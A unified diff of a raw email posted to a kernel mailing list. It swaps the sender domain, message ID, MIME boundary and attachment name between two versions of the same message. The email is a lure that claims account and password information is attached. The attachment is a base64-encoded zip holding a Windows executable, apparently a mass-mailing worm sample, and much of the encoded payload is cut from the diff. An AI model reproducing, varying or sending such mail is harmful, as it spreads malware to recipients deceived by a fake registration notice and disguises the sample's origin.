@@ -1,29 +1,29 @@
-From: hostmaster@sohu.com
+From: office@digsigtrust.com
 Subject: Registration Confirmation
 Date: Sat, 24 Dec 2005 23:43:18 UTC
-Message-ID: <eeb97ad8adad7e6e14@sohu.com>
+Message-ID: <3cbef.2ebaa9bbba60bd@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=a674fcc6322eb"
+Content-Type: multipart/mixed; boundary="===cc7744b4d4c513"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: XFreeMail@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=a674fcc6322eb
+--===cc7744b4d4c513
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.sohu.com
-***** Email: postman@sohu.com
---=a674fcc6322eb
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.digsigtrust.com
+***** Email: postman@digsigtrust.com
+--===cc7744b4d4c513
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=a674fcc6322eb--
+--===cc7744b4d4c513--
